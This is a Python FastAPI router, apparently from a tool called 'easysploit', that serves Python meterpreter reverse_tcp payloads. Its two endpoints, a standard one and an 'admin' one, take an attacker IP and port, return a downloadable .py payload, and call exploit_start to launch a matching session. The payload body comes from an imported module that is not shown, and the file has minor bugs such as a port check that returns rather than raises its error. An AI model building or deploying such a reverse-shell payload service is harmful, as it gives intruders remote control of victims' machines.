from fastapi import APIRouter, HTTPException, Request
from fastapi.responses import StreamingResponse
import io
from Data.data import PayloadInfo
import ipaddress
from Exception.exceptions import *
from Service.payloads import PayloadGeneratorService

router = APIRouter()

def is_valid_ip(ip: str) -> bool:
    try:
        ipaddress.ip_address(ip)
        return True
    except ValueError:
        raise InvalidIpAddress(ip)
    
def is_valid_port(port: int) -> bool:
    if port < 1 or port > 65535:
        return InvalidPortNumber(port)
    return True

@router.post("/python/meterpreter/reverse_tcp", tags=["python"], responses={200: {"content": {"application/octet-stream": {"example": PayloadGeneratorService.generate_payload("LHOST", "LPORT")}}}}, response_class=StreamingResponse)
async def generate_standard_payload(info:PayloadInfo, request: Request):
    try:
        is_valid_ip(info.LHOST)
        is_valid_port(info.LPORT)
        payload = PayloadGeneratorService.generate_payload(info.LHOST, info.LPORT)
        payload = io.BytesIO(payload.encode('utf-8'))
        from Service.user_socket import exploit_start, find_socket
        if find_socket(request.client.host):
            payload_type = str(request.url).replace("https://easysploit.rocknroll17.com/", "")
            exploit_start(info.LHOST, info.LPORT, request.client.host, payload_type) 
        return StreamingResponse(payload, media_type='application/octet-stream', headers={'Content-Type': 'text/x-python'}, status_code=200)
    except InvalidIpAddress as e:
        raise HTTPException(status_code=400, detail=e.message)
    except InvalidPortNumber as e:
        raise HTTPException(status_code=400, detail=e.message)
    except Exception as e:
        raise e
        raise HTTPException(status_code=500, detail=f"There was an error while generating the payload.")
    
@router.post("/python/meterpreter/reverse_tcp/admin", tags=["python"], responses={200: {"content": {"application/octet-stream": {"example": PayloadGeneratorService.generate_admin_payload("LHOST", "LPORT")}}}}, response_class=StreamingResponse)
async def generate_admin_payload(info:PayloadInfo, request: Request):
    try:
        is_valid_ip(info.LHOST)
        is_valid_port(info.LPORT)
        payload = PayloadGeneratorService.generate_admin_payload(info.LHOST, info.LPORT)
        payload = io.BytesIO(payload.encode('utf-8'))
        from Service.user_socket import exploit_start, find_socket
        if find_socket(request.client.host):
            payload_type = str(request.url).replace("https://easysploit.rocknroll17.com/", "").replace("/admin", "")
            exploit_start(info.LHOST, info.LPORT, request.client.host, payload_type) 
        return StreamingResponse(payload, media_type='application/octet-stream', headers={'Content-Type': 'text/x-python'}, status_code=200)
    except InvalidIpAddress as e:
        raise HTTPException(status_code=400, detail=e.message)
    except InvalidPortNumber as e:
        raise HTTPException(status_code=400, detail=e.message)
    except Exception as e:
        raise e
        raise HTTPException(status_code=500, detail=f"There was an error while generating the payload.")
